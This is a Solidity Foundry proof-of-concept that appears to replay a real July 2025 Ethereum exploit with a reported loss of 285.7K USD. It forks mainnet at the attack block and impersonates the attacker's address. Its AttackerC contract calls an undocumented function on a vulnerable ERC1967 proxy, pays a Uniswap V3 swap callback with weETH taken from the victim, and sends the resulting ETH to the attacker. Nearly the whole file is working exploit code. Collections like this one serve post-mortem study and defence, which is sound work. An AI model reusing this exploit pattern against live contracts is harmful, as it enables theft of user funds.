pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 285.7K USD
// Attacker : https://etherscan.io/address/0xb750e3165de458eae09904cc7fad099632860b0f
// Attack Contract : https://etherscan.io/address/0x1a61249f6f4f9813c55aa3b02c69438607272ed3
// Vulnerable Contract : https://etherscan.io/address/0x54cd23460df45559fd5feeaada7ba25f89c13525
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x54cd23460df45559fd5feeaada7ba25f89c13525

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1941689712621576493
// Twitter Guy : https://x.com/TenArmorAlert/status/1941689712621576493
// Hacking God : N/A

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV3Pool = 0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93;
address constant ERC1967Proxy = 0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525;
address constant attacker = 0xb750E3165de458EaE09904cC7Fad099632860B0f;
address constant weETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 22855568);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

contract AttackerC {
    function attack() public {
        (bool s1, ) = ERC1967Proxy.call(abi.encodeWithSelector(bytes4(0x03b79c24), address(this)));
        require(s1, "call1 failed");

        (bool s2, ) = UniswapV3Pool.call(
            abi.encodeWithSelector(
                IUniswapV3Pool.swap.selector,
                address(this),
                false,
                int256(106929468097270451433),
                uint256(1461446703485210103287273052203988822378723970341),
                bytes("")
            )
        );
        require(s2, "swap failed");

        IWETH9(weth9).withdraw(114534059890882021484);

        (bool s3, ) = attacker.call{value: address(this).balance}("");
        require(s3, "send ETH failed");
    }
  
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        IERC20(weETH).transfer(UniswapV3Pool, uint256(amount1Delta));
    }

    fallback() external payable {}
    receive() external payable {}
}

interface IWETH9 {
	function withdraw(uint256) external; 
}
interface IUniswapV3Pool {
	function swap(address, bool, int256, uint160, bytes calldata) external returns (int256, int256); 
}